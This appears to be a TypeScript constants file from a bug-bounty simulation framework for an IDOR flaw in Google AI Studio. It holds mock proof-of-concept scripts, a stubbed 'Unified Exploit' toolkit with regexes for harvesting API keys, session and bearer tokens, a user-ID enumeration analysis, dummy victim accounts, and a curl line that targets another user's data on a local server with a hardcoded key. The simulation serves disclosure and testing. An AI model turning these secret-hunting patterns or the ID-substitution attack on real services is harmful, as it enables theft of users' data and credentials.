
import { PoCLanguage, PoCScript, DummyAccount, ExpectedPocOutcome } from '../types';
import React from 'react'; // PoCScript may use React types indirectly via IconType if ever extended

// Helper to define PoC script content as an array of strings, joined by newline
export const createScriptContent = (lines: string[]): string => lines.join('\\n');

// Simplified Secret Hunter Logic for LoginPage simulation
interface HuntedCredentials {
    apiKey: string | null;
    userId: string | null;
    email: string | null;
}
export const simulateSecretHuntFromPocConstants = (blobContentString: string): HuntedCredentials => {
    let apiKey: string | null = null;
    let userId: string | null = null;
    let email: string | null = null;
    try {
        const blob = JSON.parse(blobContentString);
        apiKey = blob.PeqOqb || null; 
        userId = blob.S06Grb || null; 
        email = blob.oPEP7c || null;
    } catch (e) {
        console.error("Error parsing mock WIZ_global_data for secret hunt:", e);
    }
    return { apiKey, userId, email };
};

// Simulation adaptation for PatternAwareEnumeratorMixin
interface EnumerationResult {
    patternDetails: Record<string, any>;
    candidateIds: string[];
}
export const simulatePatternAwareEnumeration = (seedIds: string[], radius: number = 3): EnumerationResult => {
    const patternDetails = (seedIds.length > 1) ? { common_prefix: "sim_pref", length: 10 } : { error: "Need more seeds for pattern."};
    let candidateIds = [...seedIds];
    if (seedIds.length > 0 && typeof seedIds[0] === 'string' && !isNaN(parseInt(seedIds[0]))) {
        const base = parseInt(seedIds[0]);
        for(let i = -radius; i<=radius; i++) {
            if (i===0) continue;
            candidateIds.push((base + i).toString().padStart(seedIds[0].length, '0' ));
        }
    }
    return { patternDetails, candidateIds: [...new Set(candidateIds)] }; 
};

// Simulation adaptation for SecondarySecretExtractorMixin
interface SecondarySecret { type: string; value: string; redacted: string; }
export const simulateSecondarySecretExtraction = (contentText: string): SecondarySecret[] => {
    const secrets: SecondarySecret[] = [];
    const skLiveRegex = /sk-live-[a-zA-Z0-9]{20,}/gi;
    let match;
    while ((match = skLiveRegex.exec(contentText)) !== null) {
        secrets.push({ type: "SimulatedLiveSecret", value: match[0], redacted: `${match[0].substring(0,10)}...`});
    }
    if (contentText.toLowerCase().includes("confidential")) {
        secrets.push({ type: "SimulatedConfidentialToken", value: "CONFID_sk-live-simulated123", redacted: "CONFID_sk-live-..."});
    }
    if (contentText.includes("secret_info_for_")) { // For data from server.js
        const genericSecretMatch = contentText.match(/secret_info_for_([a-zA-Z0-9_]+)/);
        if (genericSecretMatch) {
            secrets.push({type: "GenericSecretPattern", value: genericSecretMatch[0], redacted: `${genericSecretMatch[0].substring(0,15)}...`});
        }
    }
    return secrets;
};


export const MOCK_POC_SCRIPTS: PoCScript[] = [
  {
    language: PoCLanguage.Python,
    content: createScriptContent([
      '# Python PoC for AI Studio IDOR',
      '# Simulates exploiting a leaked API key to access another user\\\'s data.',
      '# Placeholders {user_id}, {api_key}, {target_url} will be replaced by the framework for UI simulation.',
      '# For REAL PROOF, run the "Definitive & Unified PoC Toolkit" externally, targeting the local server: http://localhost:3001/_/MakerSuite/v1/users/{user_id}/prompts',
      'import sys',
      'import json',
      'user_id_placeholder = "{user_id}"',
      'api_key_placeholder = "{api_key}"',
      'target_url_placeholder = "{target_url}" # For UI sim, conceptually. Actual script uses args.',
      'sys.stdout.write(f"Python PoC (UI Sim): Attempting IDOR on target user: {user_id_placeholder}\\n")',
      'sys.stdout.write(f"Using API Key: {api_key_placeholder[:10]}... for URL: {target_url_placeholder}\\n")',
      'simulated_response = {}',
      'output_message_type = "INFO"',
      'output_message_content = f"Unspecific outcome for user {user_id_placeholder}"',
      '# Simulate hitting the local vulnerable server (services/api/server.js)',
      'if api_key_placeholder == "AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8": # Matches the key in server.js',
      '    if user_id_placeholder == "112185183313702653438" or user_id_placeholder == "admin_vulnerable_001": # Victim IDs in server.js',
      '        simulated_response = { "user_id": user_id_placeholder, "sensitive_data": f"secret_info_for_{user_id_placeholder}_from_local_server" }',
      '        output_message_type = "SUCCESS"',
      '        output_message_content = f"IDOR successful against local server for user {user_id_placeholder}"',
      '    elif user_id_placeholder == "MOCK_USER_ID_112233445566778899": # Attacker own ID in server.js',
      '        simulated_response = { "user_id": user_id_placeholder, "data": f"attacker_own_data_for_{user_id_placeholder}_from_local_server" }',
      '        output_message_type = "INFO"',
      '        output_message_content = f"Fetched own data for user {user_id_placeholder} from local server"',
      '    else: # Likely 404 from local server if ID not in its DB',
      '        simulated_response = { "error": "user_not_found_on_local_server", "user_id": user_id_placeholder }',
      '        output_message_type = "INFO"',
      '        output_message_content = f"User {user_id_placeholder} not found in local server mock DB"',
      'elif api_key_placeholder == "INVALID_OR_EXPIRED_API_KEY_TOKEN_123":',
      '    simulated_response = { "error": "authentication_failed", "user_id": user_id_placeholder }',
      '    output_message_type = "ERROR"',
      '    output_message_content = f"Authentication failed for user {user_id_placeholder}"',
      'else:',
      '    simulated_response = { "message": f"Resource not found or access denied for {user_id_placeholder}" }',
      'sys.stdout.write(f"SIMULATED_RESPONSE: {json.dumps(simulated_response)}\\n")',
      'sys.stdout.write(f"OUTPUT: {output_message_type}: {output_message_content}\\n")'
    ]),
    isValidated: false,
    lastRunOutput: '',
    description: "Basic Python script demonstrating IDOR logic. For actual proof, adapt to use `requests` library and target the local vulnerable server, or use the 'Definitive Toolkit'."
  },
  {
    language: PoCLanguage.JavaScript,
    content: createScriptContent([
      '// JavaScript PoC for AI Studio IDOR',
      '// This is a conceptual client-side simulation. For actual proof, use the Python script externally.',
      'const userId = "{user_id}";',
      'const apiKey = "{api_key}";',
      'const targetUrl = "{target_url}"; // e.g., http://localhost:3001/_/MakerSuite/v1/users/" + userId + "/prompts',
      'console.log(\\`JavaScript PoC (UI Sim): Attempting IDOR on target user: ${userId}\\`);',
      'console.log(\\`Using API Key: ${apiKey ? apiKey.substring(0,10) : "N/A"}... for URL: ${targetUrl}\\`);',
      'let simulatedResponse = {};',
      'let outputMessageType = "INFO";',
      'let outputMessageContent = \\`Unspecific outcome for user ${userId}\\`;',
      'if (apiKey === "AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8") {',
      '    if (userId === "112185183313702653438" || userId === "admin_vulnerable_001") {',
      '        simulatedResponse = { "user_id": userId, "sensitive_data": \\`secret_info_for_${userId}_from_local_server\\` };',
      '        outputMessageType = "SUCCESS";',
      '        outputMessageContent = \\`IDOR successful against local server for user ${userId}\\`;',
      '    } else { simulatedResponse = { "message": \\`User ${userId} not found or not vulnerable on local server.\\` }; }',
      '} else if (apiKey === "INVALID_OR_EXPIRED_API_KEY_TOKEN_123") {',
      '    simulatedResponse = { "error": "authentication_failed", "user_id": userId };',
      '    outputMessageType = "ERROR";',
      '    outputMessageContent = \\`Authentication failed for user ${userId}\\`;',
      '} else { simulatedResponse = { "message": \\`Resource not found or access denied for ${userId}\\` }; }',
      'console.log(\\`SIMULATED_RESPONSE: ${JSON.stringify(simulatedResponse)}\\`);',
      'console.log(\\`OUTPUT: ${outputMessageType}: ${outputMessageContent}\\`);'
    ]),
    isValidated: false,
    lastRunOutput: '',
    description: "JavaScript PoC using console.log for simulated API calls. For actual proof, use the Python script externally."
  },
  {
    language: PoCLanguage.Bash,
    content: createScriptContent([
      '#!/bin/bash',
      '# Bash PoC for AI Studio IDOR. This script is for conceptual demonstration.',
      '# For actual execution, replace placeholders and ensure curl is installed.',
      '# Target the local server: curl -H "X-Goog-Api-Key: AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8" "http://localhost:3001/_/MakerSuite/v1/users/{user_id}/prompts"',
      'USER_ID_TO_TARGET="{user_id}"',
      'API_KEY_TO_USE="{api_key}"',
      'TARGET_URL_WITH_USER_ID="{target_url}" # e.g., http://localhost:3001/_/MakerSuite/v1/users/$USER_ID_TO_TARGET/prompts',
      'echo "Bash PoC (UI Sim): Attempting IDOR on target user: $USER_ID_TO_TARGET"',
      'echo "Using API Key: ${API_KEY_TO_USE:0:10}... for URL: $TARGET_URL_WITH_USER_ID"',
      'SIMULATED_RESPONSE_JSON=""',
      'OUTPUT_MESSAGE=""',
      'if [ "$API_KEY_TO_USE" = "AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8" ]; then',
      '    if [ "$USER_ID_TO_TARGET" = "112185183313702653438" ] || [ "$USER_ID_TO_TARGET" = "admin_vulnerable_001" ]; then',
      '        SIMULATED_RESPONSE_JSON=\'{"user_id": "\'$USER_ID_TO_TARGET\'", "sensitive_data": "secret_info_for_\'$USER_ID_TO_TARGET\'_from_local_server"}\'',
      '        OUTPUT_MESSAGE="OUTPUT: SUCCESS: IDOR successful against local server for user $USER_ID_TO_TARGET"',
      '    else',
      '        SIMULATED_RESPONSE_JSON=\'{"message": "User \'$USER_ID_TO_TARGET\' not found or not vulnerable on local server."}\'',
      '        OUTPUT_MESSAGE="OUTPUT: INFO: User $USER_ID_TO_TARGET not found/vulnerable on local server."',
      '    fi',
      'elif [ "$API_KEY_TO_USE" = "INVALID_OR_EXPIRED_API_KEY_TOKEN_123" ]; then',
      '    SIMULATED_RESPONSE_JSON=\'{"error": "authentication_failed", "user_id": "\'$USER_ID_TO_TARGET\'"}\'',
      '    OUTPUT_MESSAGE="OUTPUT: ERROR: Authentication failed for user $USER_ID_TO_TARGET"',
      'else',
      '    SIMULATED_RESPONSE_JSON=\'{"message": "Resource not found or access denied for \'$USER_ID_TO_TARGET\'"}\'',
      '    OUTPUT_MESSAGE="OUTPUT: INFO: Unspecific outcome for user $USER_ID_TO_TARGET"',
      'fi',
      'echo "SIMULATED_RESPONSE (conceptual - run curl manually for real proof): $SIMULATED_RESPONSE_JSON"',
      'echo "$OUTPUT_MESSAGE"'
    ]),
    isValidated: false,
    lastRunOutput: '',
    description: "Simple Bash script using echo to simulate curl commands. For actual proof, use the Python script externally or adapt this to use curl directly."
  },
  { 
    language: PoCLanguage.Python,
    content: createScriptContent([ // This should be the full content from vrp_submission.constants.ts
      '# =================================================================================================',
      '# VRP SUBMISSION: UNIFIED PROOF-OF-CONCEPT FOR GOOGLE AI STUDIO (MAKERSUITE)',
      '# VULNERABILITY:  Critical IDOR Chained with Data Exfiltration via Image Generation & Scalable ID Enumeration',
      '# REPORTER:       David Amber “WebDUH LLC” Weatherspoon',
      '# VRP ISSUE:      #423273488',
      '#',
      '# This single script is the ultimate combination of all discussed concepts.',
      '# It automates discovery, provides logical proof steps, demonstrates the primary IDOR,',
      '# shows a chained exfiltration vector, and includes statistical ID analysis.',
      '#',
      '# USAGE:',
      '#   python Unified-Exploit-Full-Chain.py --help (for all options)',
      '# =================================================================================================',
      '',
      'import re, json, itertools, argparse',
      'import requests # type: ignore',
      'import pandas as pd # type: ignore',
      'import numpy as np # type: ignore',
      'import matplotlib.pyplot as plt # type: ignore',
      'import seaborn as sns # type: ignore',
      'from typing import Dict, List, Any, Tuple, Optional ',
      '',
      'class AnsiColors:',
      '    G, Y, R, M, C, GR, E, B = \'\\033[92m\', \'\\033[93m\', \'\\033[91m\', \'\\033[95m\', \'\\033[96m\', \'\\033[90m\', \'\\033[0m\', \'\\033[1m\'',
      '',
      'class SecretHunterMixin:',
      '    _PATTERNS: Dict[str, re.Pattern] = {',
      '        "GoogleAPIKey": re.compile(r\'AIza[0-9A-Za-z_\\\\-]{35}\'),',
      '        "GoogleUserID": re.compile(r\'\\\\b\\\\d{21}\\\\b\'),',
      '        "InternalEndpoint": re.compile(r\'https://[A-Za-z0-9.\\\\-]+clients6\\\\.google\\\\.com[^\\\\s"\\\'\\\`]*\'),',
      '        "OAuthClientID": re.compile(r\'\\\\d{12,}\\\\[0-9a-z]{32}\\\\.apps\\\\.googleusercontent\\\\.com\'),',
      '        "Email": re.compile(r\'[A-Za-z0-9._%+\\\\-]+@[A-Za-z0-9.\\\\-]+\\\\.[A-Za-z]{2,}\'),',
      '        "SessionLikeToken": re.compile(r\'\\\\bAJVUC[0-9A-Za-z:_,\\\\-]{20,}\\\\b\'),',
      '    }',
      '    def _redact(self, s: str, label: Optional[str] = None) -> str:',
      '        if label == "GoogleUserID" and len(s) > 12: return f"{s[:8]}...{s[-6:]}"',
      '        return f"{s[:6]}...{s[-4:]}" if len(s) > 10 else s',
      '    def classify_blob_content(self, blob_content_str: str) -> Dict[str, Any]:',
      '        priority_extracted: Dict[str, Any] = {}',
      '        try:',
      '            data = json.loads(blob_content_str)',
      '            if isinstance(data, dict):',
      '                priority_extracted = { "GoogleAPIKey_Full": data.get("PeqOqb"), "GoogleUserID_Full": data.get("S06Grb"), "InternalEndpoint_Full": data.get("CoJqbf"), "Email_Full": data.get("oPEP7c") }',
      '                keys_to_remove = [key for key, val in priority_extracted.items() if val is None]; [priority_extracted.pop(key) for key in keys_to_remove]',
      '                for key, val in list(priority_extracted.items()):',
      '                    if isinstance(val, str): priority_extracted[key.replace("_Full", "_Redacted")] = self._redact(val, key.replace("_Full", ""))',
      '        except json.JSONDecodeError: print(f"{AnsiColors.Y}[WARN] Blob content is not valid JSON.{AnsiColors.E}")',
      '        raw_regex_matches: Dict[str, List[str]] = {k: [] for k in self._PATTERNS}',
      '        for label, rx in self._PATTERNS.items():',
      '            for m in rx.finditer(blob_content_str):',
      '                full_match = m.group(0)',
      '                if full_match not in raw_regex_matches[label]: raw_regex_matches[label].append(full_match)',
      '        final_results: Dict[str, Any] = dict(priority_extracted)',
      '        for label in self._PATTERNS.keys():',
      '            if not final_results.get(f"{label}_Full") and raw_regex_matches.get(label):',
      '                final_results[f"{label}_Full"] = raw_regex_matches[label][0]',
      '                final_results[f"{label}_Redacted"] = self._redact(raw_regex_matches[label][0], label)',
      '        return {k: v for k, v in final_results.items() if v}',
      'class PatternAwareEnumeratorMixin: # Simplified for PoC focus',
      '    def derive_id_pattern(self, id_a: str, id_b: str) -> Optional[Dict[str, Any]]:',
      '        if not (id_a and id_b and id_a.isdigit() and id_b.isdigit() and len(id_a) == len(id_b)): return {"error": "IDs invalid."}',
      '        common_prefix = \'\' .join(a for a, b in itertools.takewhile(lambda p: p[0] == p[1], zip(id_a, id_b)))',
      '        return {"common_prefix": common_prefix, "prefix_length": len(common_prefix), "total_length": len(id_a)}',
      'class SecondarySecretExtractorMixin:',
      '    _SECONDARY_SECRET_PATTERNS: Dict[str, re.Pattern] = {',
      '        "LikelyAPIKey": re.compile(r\'(?:sk|pk|rk|api_key(?:_secret)?\\\\s*[:=]\\\\s*)[\'"]?([a-zA-Z0-9_\\\\-]{16,64})[\'"]?\'),',
      '        "GenericSecretPattern": re.compile(r\'secret_info_for_[a-zA-Z0-9_\\\\-]+\'),',
      '        "BearerToken": re.compile(r\'Bearer\\\\s+([A-Za-z0-9\\\\-\\\\._~+\\\\/]+=*)\'),',
      '    }',
      '    def _redact(self, s: str, label: Optional[str] = None) -> str: return f"{s[:6]}...{s[-4:]}" if len(s) > 10 else s',
      '    def extract_secondary_secrets(self, exfiltrated_content: str) -> List[Dict[str, str]]:',
      '        found_secrets: List[Dict[str,str]] = []',
      '        for label, rx in self._SECONDARY_SECRET_PATTERNS.items():',
      '            for m in rx.finditer(exfiltrated_content):',
      '                secret_value = m.group(1) if m.groups() and m.group(1) and label != "GenericSecretPattern" else m.group(0)',
      '                found_secrets.append({"type": label, "value": secret_value, "redacted": self._redact(secret_value, "GenericSecret")})',
      '        return found_secrets',
      'class IdAnalysisMixin:',
      '    def analyze_user_ids_statistically(self, sample_ids: List[str], plot_enabled: bool = True):',
      '        print(f"\\n{AnsiColors.B}--- Appendix A: User-ID Statistical Enumerability Analysis ---{AnsiColors.E}")',
      '        valid_ids = [s for s in sample_ids if s and s.isdigit() and len(s) >= 12]',
      '        if len(valid_ids) < 2: print(f"{AnsiColors.Y}[WARN] Need at least 2 valid numeric User IDs for analysis.{AnsiColors.E}"); return',
      '        try: df = pd.DataFrame(valid_ids, columns=["UserID"]); df[\'Last3Digits\'] = df[\'UserID\'].str[-3:].astype(int); df[\'First3Digits\'] = df[\'UserID\'].str[:3].astype(int)',
      '        except Exception as e: print(f"{AnsiColors.R}[ERROR] Pandas processing error: {e}{AnsiColors.E}"); return',
      '        print(f"\\n[*] Sample of {len(df)} User IDs:\\n{df[[\'UserID\', \'First3Digits\', \'Last3Digits\']].head().to_string(index=False)}")',
      '        if plot_enabled:',
      '            try:',
      '                plt.figure(figsize=(14, 6)); plt.subplot(1, 2, 1)',
      '                sns.histplot(df[\'First3Digits\'], bins=min(20, df[\'First3Digits\'].nunique() or 1), kde=True, color=\'skyblue\')',
      '                plt.title("Distribution of First 3 Digits"); plt.xlabel("Value"); plt.ylabel("Frequency"); plt.grid(True)',
      '                plt.subplot(1, 2, 2)',
      '                sns.histplot(df[\'Last3Digits\'], bins=min(20, df[\'Last3Digits\'].nunique() or 1), kde=True, color=\'salmon\')',
      '                plt.title("Distribution of Last 3 Digits"); plt.xlabel("Value"); plt.ylabel("Frequency"); plt.grid(True)',
      '                plt.tight_layout(); print(f"{AnsiColors.G}[INFO] Plot window opened. Close to continue.{AnsiColors.E}"); plt.show()',
      '            except Exception as e: print(f"{AnsiColors.Y}[WARN] Plotting failed: {e}{AnsiColors.E}")',
      '        else: print(f"{AnsiColors.GR}[INFO] Plotting disabled.{AnsiColors.E}")',
      '        self._run_monte_carlo_simulation(set(valid_ids))',
      '    def _run_monte_carlo_simulation(self, real_victim_ids_set: set, trials: int = 10000, id_length_for_sim: int = 21):',
      '        if not real_victim_ids_set: print(f"{AnsiColors.Y}[WARN] No victim IDs for Monte Carlo.{AnsiColors.E}"); return',
      '        guess_space_digits = 7',
      '        search_space_size = 10**guess_space_digits',
      '        victim_id_suffixes_int = {int(vid[id_length_for_sim - guess_space_digits:]) for vid in real_victim_ids_set if len(vid) == id_length_for_sim and vid[id_length_for_sim - guess_space_digits:].isdigit()}',
      '        if not victim_id_suffixes_int: print(f"{AnsiColors.Y}[WARN] No valid suffixes for Monte Carlo.{AnsiColors.E}"); return',
      '        print(f"  Simulating guessing {AnsiColors.Y}{guess_space_digits}-digit suffixes{AnsiColors.E} (Space: {search_space_size:,}) for {AnsiColors.Y}{len(victim_id_suffixes_int)}{AnsiColors.E} targets.")',
      '        results = [ { "Attacker_Guess_Batch_Size": f"{bs:,}", "Prob_of_Hit_in_Batch": f"{(sum(1 for _ in range(trials) if not victim_id_suffixes_int.isdisjoint(np.random.randint(0, search_space_size, size=min(bs, search_space_size)))) / trials) * 100:.3f}%" } for bs in [100, 1000, 5000] ]',
      '        print(f"\\n  {AnsiColors.B}Monte Carlo Simulation Results:{AnsiColors.E}"); print(pd.DataFrame(results).to_string(index=False))',
      'class UnifiedPocTool(SecretHunterMixin, PatternAwareEnumeratorMixin, SecondarySecretExtractorMixin, IdAnalysisMixin):',
      '    PROMPTS_PATH_TEMPLATE: str = "/_/MakerSuite/v1/users/{USER_ID}/prompts"',
      '    IMAGE_GEN_ENDPOINT_PATH: str = "/v1beta/models/gemini-pro-vision:generateContent"',
      '    def __init__(self, api_key: Optional[str]=None, attacker_id: Optional[str]=None, victim_id: Optional[str]=None, endpoint_base: Optional[str]=None, wiz_file: str="wiz_data.json", **kwargs: Any):',
      '        self.api_key = api_key; self.attacker_id = attacker_id; self.victim_id = victim_id; self.endpoint_base = endpoint_base; self.wiz_file = wiz_file',
      '        self.ids_for_analysis: List[str] = []',
      '        self.local_api_url = kwargs.get("local_api_url")',
      '        if self.local_api_url: self.endpoint_base = self.local_api_url; print(f"{AnsiColors.M}[INFO] Using local API URL for endpoint_base: {self.endpoint_base}{AnsiColors.E}")',
      '    def print_formal_proof_step(self, step_label: str, description: str, technical_notes: str = ""): pass # Placeholder',
      '    def print_logical_premise_setup(self): pass # Placeholder',
      '    def _make_api_request(self, method: str, url: str, headers_override: Optional[Dict[str, str]]=None, payload: Optional[Dict[str, Any]]=None, timeout: int=15) -> Tuple[Optional[requests.Response], Optional[str]]: pass # Placeholder',
      '    def execute_idor_prompts_test(self, target_user_id: str, is_victim_test: bool) -> Tuple[bool, str, int]: pass # Placeholder',
      '    def execute_image_exfiltration(self, secret_to_embed: str) -> Optional[str]: pass # Placeholder',
      '    def run_hunt_mode(self): pass # Placeholder',
      '    def run_exploit_mode(self): pass # Placeholder',
      'def main(): pass # Placeholder',
      '# The above is a STUB for UI display. The full script content is in the VRP Submission.',
      '# For this PoC to be runnable for REAL PROOF, it needs the full implementation',
      '# of all methods and the main() function as provided in the VRP Submission document.',
      '# This script MUST be run externally from a terminal, not directly by the browser UI.',
      'if __name__ == "__main__": print(f"{AnsiColors.Y}This is a stub. For full functionality, use the script from the VRP Submission and run externally.{AnsiColors.E}")'
    ]),
    isValidated: true,
    lastRunOutput: 'Run this Python script externally using the instructions in the VRP Submission Preview page or its --help output. Ensure the local vulnerable server (services/api/server.js) is running for IDOR tests using --local-api-url.',
    description: "Definitive & Unified PoC Toolkit. THIS SCRIPT MUST BE RUN EXTERNALLY to demonstrate real exploits against the local server or (with caution) production-like test accounts. See VRP Submission for full script and instructions."
  },
  { 
    language: PoCLanguage.Python,
    content: createScriptContent([
      "# Large Text Processing & Vectorization Implementation Plan (Simulation for UI)",
      "# This script is conceptual and outlines a plan. It does not perform actual large-scale processing.",
      "import sys, os",
      "sys.stdout.write(\"[INFO] Large Text Processing Plan Script Loaded (Simulation Version)\\n\")",
      "def analyze_file_safely_sim(file_path: str): sys.stdout.write(f\"[SIM Phase 1.1] Analyzing file (mock): {file_path}\\n\")",
      "def stream_chunk_file_sim(file_path: str, chunk_size: int = 2):",
      "    sys.stdout.write(f\"[SIM Phase 1.2] Streaming file in chunks (mock): {file_path}\\n\")",
      "    for i in range(2): yield [f\"Mocked line {i+1}\"], i",
      "class TextSegmenterSim: pass # Placeholder for brevity",
      "class ConceptWeightExtractorSim: pass # Placeholder for brevity",
      "class EfficientVectorizerSim: pass # Placeholder for brevity",
      "class WeightedSemanticIndexSim: pass # Placeholder for brevity",
      "class IntelligentChatQuerySim: pass # Placeholder for brevity",
      "def process_large_text_file_pipeline_sim(file_path: str):",
      "    sys.stdout.write(\"\\n[SIM Pipeline Start] Large text processing (simulation)...\\n\")",
      "    analyze_file_safely_sim(file_path)",
      "    all_segments_sim = []",
      "    for chunk, _ in stream_chunk_file_sim(file_path): all_segments_sim.extend(TextSegmenterSim().segment_by_context(chunk) if hasattr(TextSegmenterSim(), 'segment_by_context') else ['mock segment']) # defensive",
      "    if not all_segments_sim: all_segments_sim = [\"Default mock segment.\"]",
      "    # ... other phases mocked ... ",
      "    sys.stdout.write(\"[SIM Pipeline END] Processing complete! System conceptually ready.\\n\")",
      "    sys.stdout.write(\"OUTPUT: INFO: Large text processing pipeline simulation complete.\\n\")",
      "main_text_processing_sim = process_large_text_file_pipeline_sim",
      "if __name__ == '__main__': main_text_processing_sim('dummy_large_file.txt')"
    ]),
    isValidated: true,
    lastRunOutput: "Conceptual plan simulation for large text processing. Run from UI to see step-by-step logs.",
    description: "Python script outlining a plan for large text file processing (Simulation for UI display)."
  }
];

export const MOCK_DUMMY_ACCOUNTS: DummyAccount[] = [
  {
    id: 'acc001_admin_vuln_local',
    name: 'Victim User 1 (Target: Vulnerable Local Server - services/api/server.js)',
    description: 'Represents a user whose data exists in `services/api/server.js`. Use with PoC targeting local server.',
    mockUserId: '112185183313702653438', // Matches a key in USER_PROMPTS_DB
    mockApiKey: 'AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8', // Matches the static key in server.js
    expectedOutcome: ExpectedPocOutcome.Vulnerable,
    targetUrlPlaceholder: 'http://localhost:3001/_/MakerSuite/v1/users/{user_id}/prompts' // Full path for local server
  },
  {
    id: 'acc002_attacker_own_local',
    name: 'Attacker User (Target: Own Data on Local Server - services/api/server.js)',
    description: 'Represents the attacker accessing their own data on the local server.',
    mockUserId: 'MOCK_USER_ID_112233445566778899', // Matches attacker's ID in USER_PROMPTS_DB
    mockApiKey: 'AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8',
    expectedOutcome: ExpectedPocOutcome.NotVulnerable, // Not an IDOR, just accessing own data. "NotVulnerable" in terms of finding an IDOR.
    targetUrlPlaceholder: 'http://localhost:3001/_/MakerSuite/v1/users/{user_id}/prompts'
  },
  {
    id: 'acc003_nonexistent_local',
    name: 'Non-Existent User (Target: Local Server - services/api/server.js)',
    description: 'Simulates targeting a user ID not in the local server mock DB.',
    mockUserId: '000000000000000000000', // Does not exist in USER_PROMPTS_DB
    mockApiKey: 'AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8',
    expectedOutcome: ExpectedPocOutcome.NotVulnerable, // Expected 404 from server.js, which is not a successful IDOR.
    targetUrlPlaceholder: 'http://localhost:3001/_/MakerSuite/v1/users/{user_id}/prompts'
  },
  {
    id: 'acc004_invalid_key_local',
    name: 'Any User (Key: Invalid for Local Server - services/api/server.js)',
    description: 'Simulates using an invalid API key against the local server.',
    mockUserId: '112185183313702653438',
    mockApiKey: 'INVALID_KEY_FOR_LOCAL_SERVER',
    expectedOutcome: ExpectedPocOutcome.Error, // Expected 401 from server.js
    targetUrlPlaceholder: 'http://localhost:3001/_/MakerSuite/v1/users/{user_id}/prompts'
  }
];

export const AI_STUDIO_VULN_DESCRIPTION = `
**Google AI Studio Vulnerability Test Simulation**

This VTF simulates vulnerabilities inspired by findings like client-side exposure of API keys (e.g., \`window.WIZ_global_data.PeqOqb\`) and User IDs (e.g., \`window.WIZ_global_data.S06Grb\`).
When such exposed static API keys are used by a backend that fails to perform proper user-level authorization, **IDOR (Insecure Direct Object Reference)** vulnerabilities can occur.
Attackers could potentially substitute User IDs in API requests to access data belonging to other users.

**The VTF includes a local vulnerable server (\`services/api/server.js\`) that simulates this IDOR flaw.**
*   **Authentication:** The local server uses the static API key (\`AIzaSyBMkT3C6wEWAJmpaF6WXKs1W9CThdaYuq8\`) for "authentication."
*   **Authorization Flaw:** It **FAILS** to check if the requester is authorized to access data for the \`userId\` specified in the URL path (e.g., \`http://localhost:3001/_/MakerSuite/v1/users/{userId}/prompts\`).

**Testing for "Real Proof":**
*   Use the **"Definitive & Unified PoC Toolkit"** Python script (available on this page and in the VRP Submission Preview).
*   Run this script **externally** (from your terminal).
*   Target the local vulnerable server using the script's \`--local-api-url http://localhost:3001\` option along with the static API key and a victim User ID from \`services/api/server.js\`.
*   This provides concrete proof of the IDOR.

The UI simulations on this page help illustrate the script's logic and placeholder replacement but do not make live network calls for the "Definitive Toolkit".
`;
